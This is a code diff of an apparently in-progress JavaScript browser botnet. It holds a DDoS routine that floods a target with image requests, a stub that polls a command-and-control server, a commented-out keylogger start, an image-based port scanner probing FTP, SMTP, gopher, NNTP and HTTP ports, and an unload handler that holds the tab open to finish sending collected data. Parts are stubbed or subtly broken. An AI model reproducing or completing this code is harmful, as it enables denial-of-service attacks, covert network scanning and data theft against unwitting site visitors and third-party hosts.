@@ -18,17 +18,17 @@
         console.log('bot loaded');
 
         // get commands of command center server
-        var comms = getCommands(window.greyKnights);
+        var comms = requestCommands(window.greyKnights);
 
-//        runCommands(comms);
-//        keyLogger.start();
+        //        execCommands(comms);
+        //        keyLogger.start();
     }
 
     // DDOS function
     function dos (options) {
         for(var i = 0; i < options.numRequests; i++){
             var img = new Image();
-            var url = options.prot + '://' + options.ip + ':' + options.port + '/?' + i;
+            var url = options.prot + '://' + options.ip + ':' + options.port + '/?' + i; // i is there to prevernt cauche seeking
             img.src = url;
         }
     }
@@ -92,9 +92,45 @@
         }
     };
 
-    function getCommands(botId){
+    // request a site or sites
+    function getSites(urls){ // for routers
+
+    };
+
+    // scan an ip and port to see if open
+    function isPortUp(options,cb){
+        var img = new Image(),
+            timeout = 100;
+
+        img.onerror = function () {
+            if (!img) return;
+            img = undefined;
+            cb(true);
+        };
+
+        img.onload = img.onerror;
+
+        switch(option.port){
+            case 21:  src = 'ftp://' + this.id() + '@' + options.host + '/'; break;//ftp
+            case 25:  src = 'mailto://' + this.getid() + '@' + options.host ; break;//smtp **
+            case 70:  src = 'gopher://' + options.host + '/'; break;//gopher
+            case 119: src = 'news://' + options.host + '/'; break;//nntp **
+            case 443: src = 'https://' + options.host + '/' + this.getid() + '.jpg';
+            default:  src = 'http://' + options.host + ':' + options.port + '/' + this.getid() + '.jpg';// getid is here to prevent cache seekings;
+        }
+
+        img.src = src;
+        setTimeout(function () {
+            if (!img) return;
+            img = undefined;
+            cb(false);
+        }, timeout);
+    };
+
+    // request commands
+    function requestCommands(botId){
         console.log(botId);
-//        var command = httpGet(config.cCenter + botId)
+        //            var command = httpGet(config.cCenter + botId)
     }
 
     function httpGet(theUrl){
@@ -104,9 +140,17 @@
         return xmlHttp.responseText;
     }
 
-    function runCommands(comms){
+    function execCommands(comms){
         console.log("commands: ", comms);
         //dos({ prot: 'http', ip : 'localhost', port: 80 });
+        //    switch  case for each type of commands
+    }
+    window.onbeforeunload = finCode;
+    function finCode(){
+        // makes sure that you send all data before the user close the tab
+
+        return 'Press wait till this page closses properly.';
+
     }
 
     // start bot
